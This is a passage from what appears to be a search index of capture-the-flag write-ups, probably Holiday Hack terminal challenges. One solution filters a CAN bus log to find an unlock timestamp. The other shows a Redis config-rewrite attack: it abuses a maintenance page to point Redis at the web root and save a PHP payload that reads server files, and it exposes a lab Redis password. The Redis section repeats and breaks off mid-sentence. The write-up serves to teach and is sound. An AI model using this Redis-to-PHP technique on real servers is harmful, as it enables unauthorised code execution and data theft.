vcan0 244#000000064B (1608926676.727458) vcan0 244#0000000639 (1608926676.740472) vcan0 244#0000000627 (1608926676.753463) vcan0 244#0000000615 (1608926676.765248) vcan0 244#0000000602 (1608926676.778259) vcan0 244#00000005F0 (1608926676.790657) vcan0 244#00000005DE (1608926676.803581) vcan0 244#00000005CC (1608926676.815887) vcan0 244#00000005BA (1608926676.827905) vcan0 244#00000005A8 (1608926676.839893) vcan0 244#0000000596 (1608926676.852918) vcan0 244#0000000584 (1608926676.865137) vcan0 244#0000000572 (1608926676.878200) vcan0 244#000000055F (1608926676.889896) vcan0 244#000000054D (1608926676.902756) vcan0 244#000000053B (1608926676.914381) vcan0 244#0000000529 (1608926676.928678) vcan0 244#0000000517 (1608926676.943733) vcan0 244#0000000505 (1608926676.955255) vcan0 244#00000004F3 (1608926676.967979) vcan0 244#00000004E1 (1608926676.980286) vcan0 244#00000004CF (1608926676.992816) vcan0 244#00000004BD (1608926677.005791) vcan0 244#00000004AA (1608926677.023898) vcan0 244#0000000498 (1608926677.038187) vcan0 244#0000000486 (1608926677.053019) vcan0 244#0000000474 (1608926677.064917) vcan0 244#0000000462 (1608926677.077444) vcan0 244#0000000450 (1608926677.090974) vcan0 244#000000043E (1608926677.108963) vcan0 244#000000042C (1608926677.121427) vcan0 244#000000041A (1608926677.121567) vcan0 188#00000000 (1608926677.133434) vcan0 244#0000000407 (1608926677.149505) vcan0 244#00000003F5 (1608926677.164389) vcan0 244#00000003E3 (1608926677.178859) vcan0 244#00000003D1 (1608926677.191955) vcan0 244#00000003BF (1608926677.204090) vcan0 244#00000003AD (1608926677.217614) vcan0 244#000000039B (1608926677.229959) vcan0 244#0000000389 (1608926677.243887) vcan0 244#0000000377 (1608926677.256201) vcan0 244#0000000365 (1608926677.268317) vcan0 244#0000000352 (1608926677.281194) vcan0 244#0000000340 (1608926677.294173) vcan0 244#000000032E (1608926677.307943) vcan0 244#000000031C (1608926677.320593) vcan0 244#000000030A (1608926677.338126) vcan0 244#00000002F8 (1608926677.351183) vcan0 244#00000002E6 (1608926677.361908) vcan0 244#00000002D4 (1608926677.374783) vcan0 244#00000002C2 (1608926677.388392) vcan0 244#00000002AF (1608926677.401141) vcan0 244#000000029D (1608926677.414678) vcan0 244#000000028B (1608926677.426787) vcan0 244#0000000279 (1608926677.439069) vcan0 244#0000000267 (1608926677.451587) vcan0 244#0000000255 (1608926677.465164) vcan0 244#0000000243 (1608926677.478667) vcan0 244#0000000231 (1608926677.496258) vcan0 244#000000021F (1608926677.508874) vcan0 244#000000020D (1608926677.521829) vcan0 244#00000001FA (1608926677.536436) vcan0 244#00000001E8 (1608926677.549753) vcan0 244#00000001D6 (1608926677.562240) vcan0 244#00000001C4 (1608926677.574655) vcan0 244#00000001B2 (1608926677.588231) vcan0 244#00000001A0 (1608926677.601910) vcan0 244#000000018E (1608926677.616497) vcan0 244#000000017C (1608926677.630431) vcan0 244#000000016A (1608926677.630561) vcan0 188#00000000 (1608926677.642861) vcan0 244#0000000157 (1608926677.656056) vcan0 244#0000000145 (1608926677.668476) vcan0 244#0000000133 (1608926677.681134) vcan0 244#0000000121 (1608926677.693826) vcan0 244#000000010F (1608926677.706551) vcan0 244#00000000FD (1608926677.719336) vcan0 244#00000000EB (1608926677.732079) vcan0 244#00000000D9 (1608926677.744946) vcan0 244#00000000C7 (1608926677.760570) vcan0 244#00000000B5 (1608926677.775364) vcan0 244#00000000A2 (1608926677.789743) vcan0 244#0000000124 (1608926677.803111) vcan0 244#0000000119 (1608926677.816107) vcan0 244#000000014C (1608926677.830753) vcan0 244#0000000110 (1608926677.842352) vcan0 244#00000001AB (1608926677.856006) vcan0 244#0000000140 (1608926677.869584) vcan0 244#0000000167 (1608926677.881474) vcan0 244#000000012F (1608926677.894614) vcan0 244#00000001EA (1608926677.908144) vcan0 244#00000001EB (1608926677.921136) vcan0 244#00000001A6 (1608926677.937236) vcan0 244#00000001D2 (1608926677.950545) vcan0 244#0000000155 (1608926677.962782) vcan0 244#0000000116 (1608926677.976140) vcan0 244#000000019F (1608926677.990530) vcan0 244#000000018F (1608926678.008073) vcan0 244#000000015C (1608926678.021262) vcan0 244#000000013E (1608926678.033429) vcan0 244#00000001AD (1608926678.046909) vcan0 244#0000000151 (1608926678.060111) vcan0 244#0000000104 (1608926678.071985) vcan0 244#00000001F2 (1608926678.083847) vcan0 244#000000014E (1608926678.096437) vcan0 244#00000001C8 (1608926678.107851) vcan0 244#000000012C (1608926678.121666) vcan0 244#00000001B4 (1608926678.133549) vcan0 244#0000000156 (1608926678.141434) vcan0 188#00000000 (1608926678.148586) vcan0 244#000000019E (1608926678.162507) vcan0 244#000000016B (1608926678.177133) vcan0 244#0000000189 (1608926678.190641) vcan0 244#000000019D (1608926678.202156) vcan0 244#00000001AB (1608926678.214529) vcan0 244#000000013E (1608926678.226125) vcan0 244#0000000186 (1608926678.237962) vcan0 244#0000000158 (1608926678.251533) vcan0 244#0000000186 (1608926678.264476) vcan0 244#00000001E2 (1608926678.278343) vcan0 244#00000001DB (1608926678.291776) vcan0 244#00000001D2 (1608926678.304371) vcan0 244#00000001E8 (1608926678.316318) vcan0 244#0000000162 (1608926678.328870) vcan0 244#0000000114 (1608926678.341845) vcan0 244#0000000156 (1608926678.355350) vcan0 244#00000001D4 (1608926678.368556) vcan0 244#0000000146 (1608926678.380654) vcan0 244#0000000192 (1608926678.394633) vcan0 244#000000017F (1608926678.409006) vcan0 244#0000000140 (1608926678.423402) vcan0 244#00000001ED (1608926678.437327) vcan0 244#0000000147 (1608926678.451283) vcan0 244#00000001AE (1608926678.464014) vcan0 244#000000018E (1608926678.476738) vcan0 244#00000001D6 (1608926678.489315) vcan0 244#0000000199 (1608926678.502639) vcan0 244#0000000173 (1608926678.515574) vcan0 244#000000011E (1608926678.528405) vcan0 244#000000016A (1608926678.541244) vcan0 244#00000001E5 (1608926678.553858) vcan0 244#0000000159 (1608926678.566661) vcan0 244#0000000171 (1608926678.580414) vcan0 244#000000010A (1608926678.592863) vcan0 244#0000000193 (1608926678.604843) vcan0 244#0000000138 (1608926678.616971) vcan0 244#0000000166 (1608926678.629068) vcan0 244#0000000135 elf@ad71dd1d0e69:~$ So we're told that the candump is a log of the engine idling up and down. Additionally, there are 2 lock messages and 1 unlock message. Since the majority of the dump should be the idling messages, and since the majority of CAN IDs are 244 , we can remove the 244 messages, as they should represent one of the idling messages elf@ad71dd1d0e69:~$ grep -v \"^\\(.*\\)\\svcan0\\s244.*$\" candump.log (1608926660.970738) vcan0 188#00000000 (1608926661.474018) vcan0 188#00000000 (1608926661.978259) vcan0 188#00000000 (1608926662.478577) vcan0 188#00000000 (1608926662.977733) vcan0 188#00000000 (1608926663.483216) vcan0 188#00000000 (1608926663.989726) vcan0 188#00000000 (1608926664.491259) vcan0 188#00000000 (1608926664.626448) vcan0 19B#000000000000 (1608926664.996093) vcan0 188#00000000 (1608926665.499007) vcan0 188#00000000 (1608926666.009926) vcan0 188#00000000 (1608926666.512371) vcan0 188#00000000 (1608926667.013385) vcan0 188#00000000 (1608926667.520201) vcan0 188#00000000 (1608926668.022800) vcan0 188#00000000 (1608926668.530024) vcan0 188#00000000 (1608926669.036851) vcan0 188#00000000 (1608926669.544057) vcan0 188#00000000 (1608926670.046480) vcan0 188#00000000 (1608926670.550541) vcan0 188#00000000 (1608926671.055065) vcan0 188#00000000 (1608926671.122520) vcan0 19B#00000F000000 (1608926671.558329) vcan0 188#00000000 (1608926672.063221) vcan0 188#00000000 (1608926672.568871) vcan0 188#00000000 (1608926673.072611) vcan0 188#00000000 (1608926673.579853) vcan0 188#00000000 (1608926674.086447) vcan0 188#00000000 (1608926674.092148) vcan0 19B#000000000000 (1608926674.589954) vcan0 188#00000000 (1608926675.099853) vcan0 188#00000000 (1608926675.605010) vcan0 188#00000000 (1608926676.110132) vcan0 188#00000000 (1608926676.617537) vcan0 188#00000000 (1608926677.121567) vcan0 188#00000000 (1608926677.630561) vcan0 188#00000000 (1608926678.141434) vcan0 188#00000000 elf@ad71dd1d0e69:~$ Just to clean things up, let's remove the other idle message (the one with CAN ID 188 ) elf@ad71dd1d0e69:~$ grep -v \"^\\(.*\\)\\svcan0\\s\\(244\\|188\\).*$\" candump.log (1608926664.626448) vcan0 19B#000000000000 (1608926671.122520) vcan0 19B#00000F000000 (1608926674.092148) vcan0 19B#000000000000 elf@ad71dd1d0e69:~$ Since there are two lock messages and one unlock message, the unlock message should be 19B#00000F000000 elf@ad71dd1d0e69:~$ ./runtoanswer There are two LOCK codes and one UNLOCK code in the log. What is the decimal portion of the UNLOCK timestamp? (e.g., if the timestamp of the UNLOCK were 1608926672.391456, you would enter 391456. > 122520 Your answer: 122520 Checking.... Your answer is correct! elf@ad71dd1d0e69:~$ flag: 122520","title":"Solution"},{"location":"challenges/terminal-challenges/debug-redis/","text":"Redis Bug Hunt Shell We need your help!! The server stopped working, all that's left is the maintenance port. To access it, run: curl http://localhost/maintenance.php We're pretty sure the bug is in the index page. Can you somehow use the maintenance page to view the source code for the index page? player@c3b0b1098583:~$ Solution Recon Let's first figure out what kind of server we're on player@c3b0b1098583:~$ netstat -nltu Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 127.0.0.1:6379 0.0.0.0:* LISTEN tcp6 0 0 :::80 :::* LISTEN player@c3b0b1098583:~$ It looks like we're running a web server with HTTP (port 80) and a Redis database management system (DMBS) (port 6379) open. Since we're trying to find a bug with the index page, let's try visiting it player@c3b0b1098583:~$ curl http://localhost/index.html <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.38 (Debian) Server at localhost Port 80</address> </body></html> player@c3b0b1098583:~$ curl http://localhost/index.php Something is wrong with this page! Please use http://localhost/maintenance.php to see if y ou can figure out what's going onplayer@c3b0b1098583:~$ After trying index.html we can see that we're running an Apache HTTP (Debian) server. We can also figure out that the bug is related to index.php . Let's try using the recommended maintenance.php page. player@c3b0b1098583:~$ curl http://localhost/maintenance.php ERROR: 'cmd' argument required (use commas to separate commands); eg: curl http://localhost/maintenance.php?cmd=help curl http://localhost/maintenance.php?cmd=mget,example1 player@c3b0b1098583:~$ Since the default directory for such an Apache HTTP (Debian) server is /var/www/html, we can also try to access it. player@c3b0b1098583:~$ cd /var/www/html -bash: cd: /var/www/html: Permission denied player@c3b0b1098583:~$ web Following the ERROR's instructions, we can try passing in help into the query cmd player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=help Running: redis-cli --raw -a '<password censored>' 'help' redis-cli 5.0.3 To get help about Redis commands type: \"help @<group>\" to get a list of commands in <group> \"help <command>\" for help on <command> \"help <tab>\" to get a list of possible help topics \"quit\" to exit To set redis-cli preferences: \":set hints\" enable online hints \":set nohints\" disable online hints Set your preferences in ~/.redisclirc player@c3b0b1098583:~$ It appears that maintenance.php takes in a query string to run as a parameter to the redis-cli command on the Redis DBMS. Therefore, we can pass in valid Redis commands . Let's find out more information about the DBMS to see if there are any additional vulnerabilities besides the remote code execution (RCE). player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=info Running: redis-cli --raw -a '<password censored>' 'info' # Server redis_version:5.0.3 redis_git_sha1:00000000 redis_git_dirty:0 redis_build_id:1b271fe49834c463 redis_mode:standalone os:Linux 4.19.0-13-cloud-amd64 x86_64 arch_bits:64 multiplexing_api:epoll atomicvar_api:atomic-builtin gcc_version:8.3.0 process_id:6 run_id:66d01e5b387663e1ee659aff6ef58e6e8cc734d7 tcp_port:6379 uptime_in_seconds:1097 uptime_in_days:0 hz:10 configured_hz:10 lru_clock:15550103 executable:/usr/bin/redis-server config_file:/usr/local/etc/redis/redis.conf # Clients connected_clients:1 client_recent_max_input_buffer:0 client_recent_max_output_buffer:0 blocked_clients:0 # Memory used_memory:858912 used_memory_human:838.78K used_memory_rss:15196160 used_memory_rss_human:14.49M used_memory_peak:858912 used_memory_peak_human:838.78K used_memory_peak_perc:107.80% used_memory_overhead:846566 used_memory_startup:796760 used_memory_dataset:12346 used_memory_dataset_perc:19.86% allocator_allocated:1150968 allocator_active:1388544 allocator_resident:6008832 total_system_memory:135198154752 total_system_memory_human:125.91G used_memory_lua:41984 used_memory_lua_human:41.00K used_memory_scripts:0 used_memory_scripts_human:0B number_of_cached_scripts:0 maxmemory:0 maxmemory_human:0B maxmemory_policy:noeviction allocator_frag_ratio:1.21 allocator_frag_bytes:237576 allocator_rss_ratio:4.33 allocator_rss_bytes:4620288 rss_overhead_ratio:2.53 rss_overhead_bytes:9187328 mem_fragmentation_ratio:19.09 mem_fragmentation_bytes:14400144 mem_not_counted_for_evict:0 mem_replication_backlog:0 mem_clients_slaves:0 mem_clients_normal:49694 mem_aof_buffer:0 mem_allocator:jemalloc-5.1.0 active_defrag_running:0 lazyfree_pending_objects:0 # Persistence loading:0 rdb_changes_since_last_save:0 rdb_bgsave_in_progress:0 rdb_last_save_time:1609385427 rdb_last_bgsave_status:ok rdb_last_bgsave_time_sec:0 rdb_current_bgsave_time_sec:-1 rdb_last_cow_size:6500352 aof_enabled:0 aof_rewrite_in_progress:0 aof_rewrite_scheduled:0 aof_last_rewrite_time_sec:-1 aof_current_rewrite_time_sec:-1 aof_last_bgrewrite_status:ok aof_last_write_status:ok aof_last_cow_size:0 # Stats total_connections_received:4 total_commands_processed:6 instantaneous_ops_per_sec:0 total_net_input_bytes:264 total_net_output_bytes:30 instantaneous_input_kbps:0.00 instantaneous_output_kbps:0.00 rejected_connections:0 sync_full:0 sync_partial_ok:0 sync_partial_err:0 expired_keys:0 expired_stale_perc:0.00 expired_time_cap_reached_count:0 evicted_keys:0 keyspace_hits:0 keyspace_misses:0 pubsub_channels:0 pubsub_patterns:0 latest_fork_usec:731 migrate_cached_sockets:0 slave_expires_tracked_keys:0 active_defrag_hits:0 active_defrag_misses:0 active_defrag_key_hits:0 active_defrag_key_misses:0 # Replication role:master connected_slaves:0 master_replid:54ea0f6166f478e615c25e280b5688fce419d30b master_replid2:0000000000000000000000000000000000000000 master_repl_offset:0 second_repl_offset:-1 repl_backlog_active:0 repl_backlog_size:1048576 repl_backlog_first_byte_offset:0 repl_backlog_histlen:0 # CPU used_cpu_sys:0.778839 used_cpu_user:0.688368 used_cpu_sys_children:0.000000 used_cpu_user_children:0.002409 # Cluster cluster_enabled:0 # Keyspace db0:keys=2,expires=0,avg_ttl=0 We can check out what keys are in database 0 ( db0 ) Running: redis-cli --raw -a '<password censored>' 'keys' '*' example2 example1 player@c3b0b1098583:~$ We can also see what values are associated with the keys example2 and example1 player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=get,example2 Running: redis-cli --raw -a '<password censored>' 'get' 'example2' We think there's a bug in index.php player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=get,example1 Running: redis-cli --raw -a '<password censored>' 'get' 'example1' The site is in maintenance mode player@c3b0b1098583:~$ example2 's value confirms that we're looking for a bug in index.php . Let's look at the DBMS configuration to see if there's anything valuable. player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=config,get,* Running: redis-cli --raw -a '<password censored>' 'config' 'get' '*' dbfilename dump.rdb requirepass R3disp@ss masterauth cluster-announce-ip unixsocket logfile pidfile /var/run/redis_6379.pid slave-announce-ip replica-announce-ip maxmemory 0 proto-max-bulk-len 536870912 client-query-buffer-limit 1073741824 maxmemory-samples 5 lfu-log-factor 10 lfu-decay-time 1 timeout 0 active-defrag-threshold-lower 10 active-defrag-threshold-upper 100 active-defrag-ignore-bytes 104857600 active-defrag-cycle-min 5 active-defrag-cycle-max 75 active-defrag-max-scan-fields 1000 auto-aof-rewrite-percentage 100 stream-node-max-entries auto-aof-rewrite-min-size 67108864 hash-max-ziplist-entries 512 hash-max-ziplist-value 64 stream-node-max-bytes 4096 stream-node-max-entries 100 list-max-ziplist-size -2 list-compress-depth 0 set-max-intset-entries 512 zset-max-ziplist-entries 128 zset-max-ziplist-value 64 hll-sparse-max-bytes 3000 lua-time-limit 5000 slowlog-log-slower-than 10000 latency-monitor-threshold 0 slowlog-max-len 128 port 6379 cluster-announce-port 0 cluster-announce-bus-port 0 tcp-backlog 511 databases 16 repl-ping-slave-period 10 repl-ping-replica-period 10 repl-timeout 60 repl-backlog-size 1048576 repl-backlog-ttl 3600 maxclients 10000 watchdog-period 0 slave-priority 100 replica-priority 100 slave-announce-port 0 replica-announce-port 0 min-slaves-to-write 0 min-replicas-to-write 0 min-slaves-max-lag 10 min-replicas-max-lag 10 hz 10 cluster-node-timeout 15000 cluster-migration-barrier 1 cluster-slave-validity-factor 10 cluster-replica-validity-factor 10 repl-diskless-sync-delay 5 tcp-keepalive 300 cluster-require-full-coverage yes cluster-slave-no-failover no cluster-replica-no-failover no no-appendfsync-on-rewrite no slave-serve-stale-data yes replica-serve-stale-data yes slave-read-only yes replica-read-only yes slave-ignore-maxmemory yes replica-ignore-maxmemory yes stop-writes-on-bgsave-error yes daemonize no rdbcompression yes rdbchecksum yes activerehashing yes activedefrag no protected-mode no repl-disable-tcp-nodelay no repl-diskless-sync no aof-rewrite-incremental-fsync yes rdb-save-incremental-fsync yes aof-load-truncated yes aof-use-rdb-preamble yes lazyfree-lazy-eviction no lazyfree-lazy-expire no lazyfree-lazy-server-del no slave-lazy-flush no replica-lazy-flush no dynamic-hz yes maxmemory-policy noeviction loglevel notice supervised no appendfsync everysec syslog-facility local0 appendonly no dir / save 900 1 300 10 60 10000 client-output-buffer-limit normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60 unixsocketperm 0 slaveof notify-keyspace-events bind 127.0.0.1 player@c3b0b1098583:~$ A few things pop out: (1) The DBMS password is R3disp@ss , in case we need it, (2) the DBMS current path ( dir ) is / , and (3) the database name ( dbfilename ) is dump.rdb . Exploit In order to view the page source of index.php , we can dump the database on a php page accessible via HTTP and use said page to run php functions to print out the page source code of index.php . To do so, we need to first move the Redis DBMS onto the HTTP server so that we can access it via curl . Since we know that we're running an Apache HTTP server on Debian, we can safely assume that the web server is hosted in the default /var/www/html directory. Therefore, we can change the Redis dir to /var/www/html player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dir' '/var/www/html' OK player@c3b0b1098583:~$ We then need to have load the Redis database onto a php page so that we can run php commands player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=config,set,dbfilename,dump.php Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dbfilename' 'dump.php' OK player@c3b0b1098583:~$ Now, after saving our changes, we should be able to GET the database php page player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=save Running: redis-cli --raw -a '<password censored>' 'save' OK player@c3b0b1098583:~$ curl http://localhost/dump.php --output - REDIS0009\ufffd redis-ver5.0.3\ufffd \ufffdedis-bits\ufffd@\ufffdctime\ufffd(K\ufffd_used-mem\ufffd aof-preamble\ufffd\ufffd\ufffdexample2#We think there's a bug in index.phexample1The site is in maintena nce mode\ufffd\ufffd\ufffd\ufffd\ufffdA\ufffd\ufffd\ufffdplayer@c3b0b1098583:~$ player@c3b0b1098583:~$ Therefore, we can now add a php function to print the index.php page source when executed as the page loads. Since we can't modify anything on the web server, we can load the php function as the value of a key-value pair into the database player@c3b0b1098583:~$ curl 'http://localhost/maintenance.php?cmd=set,exploit,<?php+echo+readfile(\"index.php\");+?>' Running: redis-cli --raw -a '<password censored>' 'set' 'exploit' '<?php echo readfile(\"index.php\"); ?>' OK player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=save Running: redis-cli --raw -a '<password censored>' 'save' OK player@c3b0b1098583:~$ Let's see if it works player@c3b0b1098583:~$ curl http://localhost/dump.php --output - REDIS0009\ufffd redis-ver5.0.3\ufffd \ufffdedis-bits\ufffd@\ufffdctime\ufffd,O\ufffd_used-mem\ufffd@? aof-preamble\ufffd\ufffd\ufffdexample1The site is in maintenance modeexploit$<?php # We found the bug!! # # \\ / # .\\-/. # /\\ () () # \\/~---~\\.-~^-. # .-~^-./ | \\---. # { | } \\ # .-~\\ | /~-. # / \\ A / \\ # \\/ \\/ # echo \"Something is wrong with this page! Please use http://localhost/maintenance.php to se e if you can figure out what's going on\" ?> 48example2#We think there's a bug in index.php\ufffd\ufffdX^M\ufffd0\ufffdIplayer@c3b0b1098583:~$","title":"Terminal/Debug Redis"},{"location":"challenges/terminal-challenges/debug-redis/#redis-bug-hunt","text":"","title":"Redis Bug Hunt"},{"location":"challenges/terminal-challenges/debug-redis/#shell","text":"We need your help!! The server stopped working, all that's left is the maintenance port. To access it, run: curl http://localhost/maintenance.php We're pretty sure the bug is in the index page. Can you somehow use the maintenance page to view the source code for the index page? player@c3b0b1098583:~$","title":"Shell"},{"location":"challenges/terminal-challenges/debug-redis/#solution","text":"","title":"Solution"},{"location":"challenges/terminal-challenges/debug-redis/#recon","text":"Let's first figure out what kind of server we're on player@c3b0b1098583:~$ netstat -nltu Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 127.0.0.1:6379 0.0.0.0:* LISTEN tcp6 0 0 :::80 :::* LISTEN player@c3b0b1098583:~$ It looks like we're running a web server with HTTP (port 80) and a Redis database management system (DMBS) (port 6379) open. Since we're trying to find a bug with the index page, let's try visiting it player@c3b0b1098583:~$ curl http://localhost/index.html <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.38 (Debian) Server at localhost Port 80</address> </body></html> player@c3b0b1098583:~$ curl http://localhost/index.php Something is wrong with this page! Please use http://localhost/maintenance.php to see if y ou can figure out what's going onplayer@c3b0b1098583:~$ After trying index.html we can see that we're running an Apache HTTP (Debian) server. We can also figure out that the bug is related to index.php . Let's try using the recommended maintenance.php page. player@c3b0b1098583:~$ curl http://localhost/maintenance.php ERROR: 'cmd' argument required (use commas to separate commands); eg: curl http://localhost/maintenance.php?cmd=help curl http://localhost/maintenance.php?cmd=mget,example1 player@c3b0b1098583:~$ Since the default directory for such an Apache HTTP (Debian) server is /var/www/html, we can also try to access it. player@c3b0b1098583:~$ cd /var/www/html -bash: cd: /var/www/html: Permission denied player@c3b0b1098583:~$ web Following the ERROR's instructions, we can try passing in help into the query cmd player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=help Running: redis-cli --raw -a '<password censored>' 'help' redis-cli 5.0.3 To get help about Redis commands type: \"help @<group>\" to get a list of commands in <group> \"help <command>\" for help on <command> \"help <tab>\" to get a list of possible help topics \"quit\" to exit To set redis-cli preferences: \":set hints\" enable online hints \":set nohints\" disable online hints Set your preferences in ~/.redisclirc player@c3b0b1098583:~$ It appears that maintenance.php takes in a query string to run as a parameter to the redis-cli command on the Redis DBMS. Therefore, we can pass in valid Redis commands . Let's find out more information about the DBMS to see if there are any additional vulnerabilities besides the remote code execution (RCE). player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=info Running: redis-cli --raw -a '<password censored>' 'info' # Server redis_version:5.0.3 redis_git_sha1:00000000 redis_git_dirty:0 redis_build_id:1b271fe49834c463 redis_mode:standalone os:Linux 4.19.0-13-cloud-amd64 x86_64 arch_bits:64 multiplexing_api:epoll atomicvar_api:atomic-builtin gcc_version:8.3.0 process_id:6 run_id:66d01e5b387663e1ee659aff6ef58e6e8cc734d7 tcp_port:6379 uptime_in_seconds:1097 uptime_in_days:0 hz:10 configured_hz:10 lru_clock:15550103 executable:/usr/bin/redis-server config_file:/usr/local/etc/redis/redis.conf # Clients connected_clients:1 client_recent_max_input_buffer:0 client_recent_max_output_buffer:0 blocked_clients:0 # Memory used_memory:858912 used_memory_human:838.78K used_memory_rss:15196160 used_memory_rss_human:14.49M used_memory_peak:858912 used_memory_peak_human:838.78K used_memory_peak_perc:107.80% used_memory_overhead:846566 used_memory_startup:796760 used_memory_dataset:12346 used_memory_dataset_perc:19.86% allocator_allocated:1150968 allocator_active:1388544 allocator_resident:6008832 total_system_memory:135198154752 total_system_memory_human:125.91G used_memory_lua:41984 used_memory_lua_human:41.00K used_memory_scripts:0 used_memory_scripts_human:0B number_of_cached_scripts:0 maxmemory:0 maxmemory_human:0B maxmemory_policy:noeviction allocator_frag_ratio:1.21 allocator_frag_bytes:237576 allocator_rss_ratio:4.33 allocator_rss_bytes:4620288 rss_overhead_ratio:2.53 rss_overhead_bytes:9187328 mem_fragmentation_ratio:19.09 mem_fragmentation_bytes:14400144 mem_not_counted_for_evict:0 mem_replication_backlog:0 mem_clients_slaves:0 mem_clients_normal:49694 mem_aof_buffer:0 mem_allocator:jemalloc-5.1.0 active_defrag_running:0 lazyfree_pending_objects:0 # Persistence loading:0 rdb_changes_since_last_save:0 rdb_bgsave_in_progress:0 rdb_last_save_time:1609385427 rdb_last_bgsave_status:ok rdb_last_bgsave_time_sec:0 rdb_current_bgsave_time_sec:-1 rdb_last_cow_size:6500352 aof_enabled:0 aof_rewrite_in_progress:0 aof_rewrite_scheduled:0 aof_last_rewrite_time_sec:-1 aof_current_rewrite_time_sec:-1 aof_last_bgrewrite_status:ok aof_last_write_status:ok aof_last_cow_size:0 # Stats total_connections_received:4 total_commands_processed:6 instantaneous_ops_per_sec:0 total_net_input_bytes:264 total_net_output_bytes:30 instantaneous_input_kbps:0.00 instantaneous_output_kbps:0.00 rejected_connections:0 sync_full:0 sync_partial_ok:0 sync_partial_err:0 expired_keys:0 expired_stale_perc:0.00 expired_time_cap_reached_count:0 evicted_keys:0 keyspace_hits:0 keyspace_misses:0 pubsub_channels:0 pubsub_patterns:0 latest_fork_usec:731 migrate_cached_sockets:0 slave_expires_tracked_keys:0 active_defrag_hits:0 active_defrag_misses:0 active_defrag_key_hits:0 active_defrag_key_misses:0 # Replication role:master connected_slaves:0 master_replid:54ea0f6166f478e615c25e280b5688fce419d30b master_replid2:0000000000000000000000000000000000000000 master_repl_offset:0 second_repl_offset:-1 repl_backlog_active:0 repl_backlog_size:1048576 repl_backlog_first_byte_offset:0 repl_backlog_histlen:0 # CPU used_cpu_sys:0.778839 used_cpu_user:0.688368 used_cpu_sys_children:0.000000 used_cpu_user_children:0.002409 # Cluster cluster_enabled:0 # Keyspace db0:keys=2,expires=0,avg_ttl=0 We can check out what keys are in database 0 ( db0 ) Running: redis-cli --raw -a '<password censored>' 'keys' '*' example2 example1 player@c3b0b1098583:~$ We can also see what values are associated with the keys example2 and example1 player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=get,example2 Running: redis-cli --raw -a '<password censored>' 'get' 'example2' We think there's a bug in index.php player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=get,example1 Running: redis-cli --raw -a '<password censored>' 'get' 'example1' The site is in maintenance mode player@c3b0b1098583:~$ example2 's value confirms that we're looking for a bug in index.php . Let's look at the DBMS configuration to see if there's anything valuable. player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=config,get,* Running: redis-cli --raw -a '<password censored>' 'config' 'get' '*' dbfilename dump.rdb requirepass R3disp@ss masterauth cluster-announce-ip unixsocket logfile pidfile /var/run/redis_6379.pid slave-announce-ip replica-announce-ip maxmemory 0 proto-max-bulk-len 536870912 client-query-buffer-limit 1073741824 maxmemory-samples 5 lfu-log-factor 10 lfu-decay-time 1 timeout 0 active-defrag-threshold-lower 10 active-defrag-threshold-upper 100 active-defrag-ignore-bytes 104857600 active-defrag-cycle-min 5 active-defrag-cycle-max 75 active-defrag-max-scan-fields 1000 auto-aof-rewrite-percentage 100 stream-node-max-entries auto-aof-rewrite-min-size 67108864 hash-max-ziplist-entries 512 hash-max-ziplist-value 64 stream-node-max-bytes 4096 stream-node-max-entries 100 list-max-ziplist-size -2 list-compress-depth 0 set-max-intset-entries 512 zset-max-ziplist-entries 128 zset-max-ziplist-value 64 hll-sparse-max-bytes 3000 lua-time-limit 5000 slowlog-log-slower-than 10000 latency-monitor-threshold 0 slowlog-max-len 128 port 6379 cluster-announce-port 0 cluster-announce-bus-port 0 tcp-backlog 511 databases 16 repl-ping-slave-period 10 repl-ping-replica-period 10 repl-timeout 60 repl-backlog-size 1048576 repl-backlog-ttl 3600 maxclients 10000 watchdog-period 0 slave-priority 100 replica-priority 100 slave-announce-port 0 replica-announce-port 0 min-slaves-to-write 0 min-replicas-to-write 0 min-slaves-max-lag 10 min-replicas-max-lag 10 hz 10 cluster-node-timeout 15000 cluster-migration-barrier 1 cluster-slave-validity-factor 10 cluster-replica-validity-factor 10 repl-diskless-sync-delay 5 tcp-keepalive 300 cluster-require-full-coverage yes cluster-slave-no-failover no cluster-replica-no-failover no no-appendfsync-on-rewrite no slave-serve-stale-data yes replica-serve-stale-data yes slave-read-only yes replica-read-only yes slave-ignore-maxmemory yes replica-ignore-maxmemory yes stop-writes-on-bgsave-error yes daemonize no rdbcompression yes rdbchecksum yes activerehashing yes activedefrag no protected-mode no repl-disable-tcp-nodelay no repl-diskless-sync no aof-rewrite-incremental-fsync yes rdb-save-incremental-fsync yes aof-load-truncated yes aof-use-rdb-preamble yes lazyfree-lazy-eviction no lazyfree-lazy-expire no lazyfree-lazy-server-del no slave-lazy-flush no replica-lazy-flush no dynamic-hz yes maxmemory-policy noeviction loglevel notice supervised no appendfsync everysec syslog-facility local0 appendonly no dir / save 900 1 300 10 60 10000 client-output-buffer-limit normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60 unixsocketperm 0 slaveof notify-keyspace-events bind 127.0.0.1 player@c3b0b1098583:~$ A few things pop out: (1) The DBMS password is R3disp@ss , in case we need it, (2) the DBMS current path ( dir ) is 